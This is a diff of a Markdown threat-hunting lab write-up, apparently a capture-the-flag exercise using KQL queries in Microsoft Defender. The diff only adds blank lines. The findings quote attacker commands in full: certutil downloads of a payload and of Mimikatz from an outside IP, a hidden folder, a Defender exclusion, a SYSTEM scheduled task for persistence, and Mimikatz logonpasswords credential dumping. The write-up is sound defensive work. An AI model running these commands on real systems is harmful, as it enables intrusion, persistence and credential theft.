@@ -102,7 +102,9 @@ DeviceProcessEvents
 **Finding**: PowerShell was used to create the folder `WindowsCache` at `2025-11-19T19:05:30.755805Z`. The folder was then hidden at `2025-11-19T19:05:33.7665036Z`.
 
 **Folder Path:** `C:\ProgramData\WindowsCache`  
+
 **Commands Found**:  `attrib.exe +h +s C:\ProgramData\WindowsCache`  
+
 **Thoughts**: I initially went in looking for hidden directories, which is why I filtered for `attrib.exe` first. I then went back and filtered for the hidden folder to see how it was created.
 
 **KQL Queries**:
@@ -141,7 +143,9 @@ DeviceRegistryEvents
 ##  Flag 6 – What temporary folder path was excluded from Windows Defender scanning
 
 **Finding**:  The temp folder was excluded from Windows Defender at `2025-11-19T18:49:27.6830204Z`.  
-**REG Value Name**: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`    
+
+**REG Value Name**: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  
+
 **REG Path**: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
 
 
@@ -157,7 +161,9 @@ DeviceRegistryEvents
 ##  Flag 7 – Identify the Windows-native binary the attacker abused to download files
 
 **Finding**: The attacker abused `certutil.exe` to download malicious content from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `svchost.exe`.  
-**Time of Event**: `2025-11-19T19:07:01.032199Z`
+
+**Time of Event**: `2025-11-19T19:07:01.032199Z`  
+
 **Command Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
 
 
@@ -173,7 +179,9 @@ DeviceFileEvents
 ##  Flag 8 & 9 – Identify the name and executable path of the scheduled task created for persistence
 
 **Finding**: The attacker created a scheduled task named "Windows Update Check" that would secretly execute the malicious payload `svchost.exe` daily at 02:00 under the SYSTEM account.  
-**Time of Event**: `2025-11-19T19:07:46.9796512Z`    
+
+**Time of Event**: `2025-11-19T19:07:46.9796512Z`  
+
 **Command Used**: `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`
 
 
@@ -189,6 +197,7 @@ DeviceProcessEvents
 ##  Flag 10 & 11 –  Identify the IP address and the destination port of the command and control server
 
 **Finding**: A network connection was initiated by `svchost.exe` to external `IP 78.141.196.6` over `port 443` at `2025-11-19T19:11:04.1766386Z`.  
+
 **Thoughts**: I wanted to check for network events that happened shortly after `svchost.exe` was downloaded. This explains my reasoning for the timestamp range in my query. 
 
 
@@ -204,7 +213,8 @@ DeviceNetworkEvents
 ---
 ##  Flag 12 & 13 – Identify the filename of the credential dumping tool and the module used to extract logon passwords
 
-**Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.    
+**Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.  
+
 **Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`
 
 **KQL Queries**:
